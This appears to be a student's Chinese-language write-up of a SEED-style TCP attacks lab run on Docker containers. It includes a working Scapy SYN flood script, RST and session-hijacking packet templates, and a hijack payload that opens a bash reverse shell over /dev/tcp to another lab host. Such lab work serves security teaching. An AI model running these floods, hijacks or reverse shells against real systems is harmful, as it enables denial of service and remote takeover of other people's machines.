# Overview 
在这个实验室中，将对TCP进行几次攻击。本实验室涵盖以下主题：
• The TCP protocol

• TCP SYN flflood attack, and SYN cookies

• TCP reset attack

• TCP session hijacking attack

• Reverse shell

• A special type of TCP attack, the Mitnick attack, is covered in a separate lab.


# Lab Environment
Lab Environment

在这个实验室里，我们至少需要有三台机器。我们使用容器来设置实验室环境。图1描述了实验室的设置。我们将使用攻击者容器来发起攻击，同时使用其他三个容器作为受害者和用户机器。我们假设所有这些机器都在同一个局域网上。学生们也可以在这个实验室中使用三台虚拟机，但使用容器将会方便得多。

Figure 1: Lab environment setup
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/setup.png]]

```
$ dcbbuild
$ dcup
$ dockps
```
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/1.png]]




# Task 1: SYN Flooding attack
SYN flood是一种DoS攻击形式，攻击者向受害者的TCP端口发送许多SYN请求，但攻击者无意完成三方握手过程。攻击者要么使用欺骗的IP地址，要么不继续此过程。通过这次攻击，攻击者使用半连接可以淹没受害者的队列

已经完成了SYN，SYN-ACK，但还没有得到最后的ACK。当此队列已满时，受害者无法再进行任何连接。图2说明了这次攻击。

Figure 2: SYN Flooding Attack
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/2.png]]



查看，队列的大小
```
$ sysctl net.ipv4.tcp_max_syn_backlog
```

SYN Cookie Countermeasure：默认情况下，Ubuntu’s SYN flooding countermeasure被打开。这种机制叫做SYN cookie。如果机器检测到它受到了SYN flooding attacks ，它就会启动。在我们的受害者服务器容器中，我们已经关闭了它（参见docker-compose.yml文件中的系统转换条目）。我们可以使用以下的sysctl命令来打开和关闭它：
```
# sysctl -a | grep syncookies (Display the SYN cookie flag)
# sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)
# sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)
```

## Task 1.1: Launching the Attack Using Python
我们提供了一个名为synflood.py的Python程序，但是我们故意在代码中遗漏了一些必要的数据。此代码发送被欺骗的TCP SYN数据包，具有随机生成的源IP地址、源端口和序列号。学生应该完成代码，然后使用它来对目标机器发起攻击：
```python
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

# ip = IP(dst="*.*.*.*")
# tcp = TCP(dport=**, flags=’S’)

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, seq=1551, flags='S')
pkt = ip/tcp

while True:

	pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
	pkt[TCP].sport = getrandbits(16) # source port
	pkt[TCP].seq = getrandbits(32) # sequence number
	send(pkt, verbose = 0)

```


队列的大小：在队列中可以存储多少个半开的连接会影响攻击的成功率。可以使用以下命令调整队列的大小：

sysctl -w net.ipv4.tcp_max_syn_backlog=80


给脚本添加执行权限，然后在Attacker上使用Python脚本再测试一遍。

![[py1.png]]

但是官方教程表示该过程不会成功，是因为该过程中Victim发送的SYN+ACK包被网关收到后会发送RST包给Victim(具体原因可见教程PDF)，之后Victim会清除队列里的对应项。所以这就导致只有脚本发送数据包的速度足够快该实验才能成功。C的速度足够快可以成功，但是Python脚本发送数据包的速度太慢了，所以不足以成功。经过测试后，发现确实是这样，当试图和Victim建立telnet连接时，会停顿1~2秒，但是之后又可以正常建立连接了，看来确实是Python发送包的速度不够快。


**让攻击至少一分钟，然后试着进入受害者机器，看看是否能成功。你的攻击很有可能会失败。多种问题可能会导致攻击的失败。下面列出了它们，以及关于如何解决它们的指导方针。**
文档里面的不看了




## Task 1.2: Launch the Attack Using C
**攻击前的工作:**
1. SYN Flooding攻击之前Victim主机已经设置syncookies=0。
```
# sysctl -a | grep syncookies
```
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/3.png]]

2. 收到攻击之前，在Victim主机查看网络连接的状态:
```
# netstat -net
```

![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/4.png]]

3.  在攻击之前使用User1主机(10.9.0.6)访问Victim(10.9.0.5)主机的Telnet服务，可以正常访问
```
# telnet 10.9.0.5
```
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/5.png]]

**进行攻击**
足够快地发送被欺骗的SYN数据包，1.1中Python出现的问题就能解决
在虚拟机上编译程序（synflood.c ），然后对目标机器发起攻击
```
// Compile the code on the host VM
$ gcc -o synflood synflood.c

// Launch the attack from the attacker container
# synflood 10.9.0.5 23
```

在Victim主机上再次使用netstat -nat命令查看网络连接状态发现大量SYN_RECV连接
```
netstat -nat
```

![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/6.png]]

1在User2主机上访问Victim(10.9.0.5)的Telnet服务：
```
telnet 10.9.0.5
```

![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/7.png]]
发现访问超时。

这里需要注意一点，先前和Victim主机建立过telnet连接的User1主机已经”被记住”了，所以即使是有攻击，也依然可以和Victim主机建立telnet连接，可以使用其他未访问过的主机尝试建立连接，或者在Victim主机使用ip tcp_metrics flush命令”刷新记忆”，Uuser1就无法建立连接了。如下所示:
```
# ip tcp_metrics show
# ip tcp_metrics flush 
# ip tcp_metrics show
```

![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/8.png]]

## Task 1.3: Enable the SYN Cookie Countermeasure
请启用SYN cookie机制，并再次运行攻击，并比较结果。

```
# sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)
# ip tcp_metrics flush # 清空记忆
```
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/9.png]]

![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/10.png]]
进行攻击和连接
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/11.png]]

发现在攻击期间，即使使用ip tcp_metrics flush命令清空记忆，User1也可以建立连接。


# Task 2: TCP RST Attacks on telnet Connections
TCP RST攻击可以终止两个受害者之间已建立的TCP连接。例如，如果两个用户a和B之间已建立了telnet连接（TCP），攻击者可以从a到B欺骗一个RST数据包，从而破坏这个现有的连接。为了成功地进行此攻击，攻击者需要正确地构建TCP RST数据包。


在此任务中，您需要从虚拟机启动TCP RST攻击，以断开a和B之间现有的远程网络连接，这是容器。为了简化实验，我们假设攻击者和受害者在同一个局域网上，即攻击者可以观察A和B之间的TCP流量。



手动启动攻击。请使用Scapy来进行TCP RST攻击。下面提供了一个基本代码。您需要用实际值替换每个@@@@（可以使用Wireshark获取）：


```
#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=xxx dport=23, flags="R", seq=xxx，ack=xxx)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
```

1.  开启wireshark监听网卡
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/12.png]]

2. 在User1(10.9.0.6)上发起对Victim(10.9.0.5)的telnet连接.在wireshark上方输入过滤条件: 
```
tcp.dstport==23&&ip.dst==10.9.0.5.
```
之后找到User1发送的最后一个包的ACK，可以发现源端口号、seq、ack.
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/13.png]]
3. 然后将端口号和seq以及ack号填入脚本，之后再Attacker主机上发起攻击
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/14.png]]


5.  此时在User1主机上发现连接已经断开了。

![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/15.png]]

![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/16.png]]
# Task 3: TCP Session Hijacki

TCP会话劫持攻击的目标是通过向该会话中注入恶意内容来劫持两个受害者之间的现有TCP连接（会话）。如果此连接是一个telnet会话，则攻击者可以向此会话中注入恶意命令（例如，删除一个重要的文件），从而导致受害者执行恶意命令。 

Figure 3: TCP Session Hijacking Attack
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/17.png]]

请使用Scapy进行TCP会话劫持攻击。下面提供了一个基本代码。您需要用一个实际的值替换每个@@@@；您可以使用Wireshark来找出您应该在被欺骗的TCP数据包的每个字段中输入什么值。

```
#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=@@@@, dport=@@@@, flags="A", seq=@@@@, ack=@@@@)
data = "@@@@" //command
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

```

![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/18.png]]

Attacker 开始攻击。

在Victim(10.9.0.5)上查看效果。
成功创建一个文件夹
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/19.png]]


# Task 4: Creating Reverse Shell using TCP Session Hijacking
本实验在Victim和User1(10.9.0.6)之间建立连接，然后Attacker主机攻击，将shell反弹到User2(10.9.0.7)上。


这一个实验还是重复Task3的过程，不过是将攻击脚本中的data换成产生后门的命令，如下所示：

```
#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=@@@@, dport=@@@@, flags="A", seq=@@@@, ack=@@@@)
data = "/bin/bash -i > /dev/tcp/10.9.0.7/9090 2>&1 0<&1\r"  # 这里的命令可以是别的 只要最后能看到效果就好
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
```

1. 开启wireshark监听telnet连接 (同上)
2.  填写攻击脚本 (srcport, seq, ack)
3. 在Attacker主机上攻击。可以看到在User2主机(10.9.0.7)上有了和Victim的连接，成功拿到shell。



![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/20.png]]


可以看到在User2主机(10.9.0.7)上有了和Victim的连接，成功拿到shell。
![[大三下/网络与信息安全/TCP_Attacks Lab/attachments/21.png]]


```
netstat -anp | grep 9090
kill -9 进程号
```